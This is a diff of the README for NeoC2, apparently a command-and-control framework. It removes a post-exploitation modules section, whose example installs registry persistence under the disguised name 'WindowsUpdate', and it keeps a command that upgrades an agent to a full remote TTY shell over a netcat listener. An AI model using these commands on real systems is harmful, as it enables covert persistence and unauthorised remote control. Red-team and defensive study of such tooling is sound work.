@@ -8,7 +8,6 @@
 - [Task Management](#task-management)
 - [Agent Management](#agent-management)
 - [Interactive Mode](#interactive-mode)
-- [Modules and Post-Exploitation](#modules-and-post-exploitation)
 - [Evasion Techniques](#evasion-techniques)
 - [File Operations](#file-operations)
 - [Task Chaining](#task-chaining-web-ui-only)
@@ -345,36 +344,6 @@ NeoC2 [INTERACTIVE:abc123] >  kill
 Start a netcat listener in another terminal and send the command below to the agent. This upgrades interaction with an agent from a task-based interactive mode to a complete TTY Shell
 ```
 NeoC2 > tty_shell <ip> <port> # default port is 5000
-```
-
-## Modules and Post-Exploitation
-
-NeoC2 includes a modular framework for post-exploitation activities. Using Python, Powershell or Bash. 
-
-### Available Modules
-
-```
-modules list                  # List available modules
-modules load <module_name>    # Load a specific module
-modules info <module_name>    # Get module information
-run <module_name> [options]   # Execute a module
-```
-
-### Module Categories
-
-1. **Evasion**: Bypass security mechanisms
-2. **Persistence**: Maintain access across reboots
-3. **Reconnaissance**: Gather system information
-4. **Lateral Movement**: Move to other systems
-
-### Example Module Usage
-
-```
-# Load and run sleep obfuscation module
-
-# Load and run persistence module
-modules load persistence
-run persistence agent_id=<id> method=registry payload_path=C:\payload.exe name=WindowsUpdate
 ```
 
 ## Evasion Techniques
